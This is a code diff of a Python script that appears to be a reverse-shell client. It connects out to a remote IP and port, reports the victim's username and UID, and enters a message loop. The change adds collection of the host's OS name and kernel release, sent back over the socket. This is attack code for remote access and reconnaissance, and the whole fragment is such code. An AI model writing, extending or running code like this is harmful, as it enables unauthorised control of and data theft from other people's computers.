@@ -2,7 +2,8 @@ import socket
 import subprocess
 import os
 import pwd
-
+import platform
+import time
 
 
 def session_handler(sock, target_ip, target_port):
@@ -10,6 +11,10 @@ def session_handler(sock, target_ip, target_port):
     sock.connect((target_ip, target_port))
     outbound(sock, pwd.getpwuid(os.getuid())[0])
     outbound(sock, os.getuid())
+    time.sleep(1)
+    op_sys = platform.uname()
+    op_sys =(f'{op_sys[0]} {op_sys[2]}')
+    outbound(sock, op_sys)
     print(f'[+] Connected to {target_ip}.')
     while True:
         message = inbound(sock)
